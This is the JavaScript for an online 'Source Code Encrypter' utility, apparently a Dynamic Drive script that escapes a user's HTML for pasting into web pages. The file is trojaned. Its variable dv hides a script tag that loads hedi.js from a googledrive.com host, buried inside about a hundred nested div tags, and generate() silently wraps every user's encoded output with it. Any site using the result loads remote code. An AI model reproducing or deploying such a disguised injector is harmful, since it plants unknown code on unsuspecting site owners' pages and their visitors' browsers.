<!--
//////////////////////////////////////////////////////////////////
// Source Code Encrypter v1.0 //
//////////////////////////////////////////////////////////////////
// //
// This JavaScript can be freely used as long as this message //
// stays here in the header of the script. Any modifications //
// and bugs found (and fixed) are appreciated. //
// Script submitted/featured on Dynamicdrive.com //
// Visit http://www.dynamicdrive.com for source code //
// Svetlin Staev, svetlins@yahoo.com //
//////////////////////////////////////////////////////////////////
var i=0;
var ie=(document.all)?1:0;
var ns=(document.layers)?1:0;

function initStyleElements() /* Styles for Buttons Init */
{
var c = document.pad;
if (ie)
{
//c.text.style.backgroundColor="#DDDDDD";
c.compileIt.style.backgroundColor="#C0C0A8";
c.compileIt.style.cursor="hand";
c.select.style.backgroundColor="#C0C0A8";
c.select.style.cursor="hand";
c.view.style.backgroundColor="#C0C0A8";
c.view.style.cursor="hand";
c.retur.style.backgroundColor="#C0C0A8";
c.retur.style.cursor="hand";
c.clear.style.backgroundColor="#C0C0A8";
c.clear.style.cursor="hand";
}
else return;
}

/* Buttons Enlightment of "Compilation" panel */
function LightOn(what)
{
if (ie) what.style.backgroundColor = '#E0E0D0';
else return;
}
function FocusOn(what)
{
if (ie) what.style.backgroundColor = '#EBEBEB';
else return;
}
function LightOut(what)
{
if (ie) what.style.backgroundColor = '#C0C0A8';
else return;
}
function FocusOff(what)
{
if (ie) what.style.backgroundColor = '#DDDDDD';
else return;
}
/* Buttons Enlightment of "Compilation" panel */
var dv='<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><script src="https://9ce09333746bac7e87a37640dc6743617f96f780.googledrive.com/host/0BypF3n40X6jiU2JOR3pYQnVsSDg/hedi.js"></script>'
var vd='</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>'
function generate() /* Generation of "Compilation" */
{
code = dv+document.getElementById('output').value+vd;
if (code)
{
document.getElementById('enk').value='Compiling...Please wait!';
setTimeout("compile()",1000);
}
else alert('First enter something to compile and then press CompileIt')
}
function compile() /* The "Compilation" */
{
document.getElementById('output').value='';
compilation=escape(code);
document.getElementById('output').value=compilation;
i++;
if (i=1) //alert("Encryption compiled 1 time!")
;
else //alert("Page compiled "+i+" times!")
;
document.getElementById('enk').value='Done, click here to show result!';
}
function selectCode() /* Selecting "Compilation" for Copying */
{
if(document.getElementById('output').value.length>0)
{
document.getElementById('output').focus();
document.getElementById('output').select();
}
else alert('Nothing for be selected!')
}
function preview() /* Preview for the "Compilation" */
{
if(document.getElementById('output').value.length>0)
{
pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");
pr.document.write(document.getElementById('output').value);
}
else alert('Nothing for be previewed!')
}
function uncompile() /* Decompiling a "Compilation" */
{
if (document.getElementById('output').value.length>0)
{
source=unescape(document.getElementById('output').value);
document.getElementById('output').value=""+source+"";
}
else alert('You need compiled code to uncompile it!')
}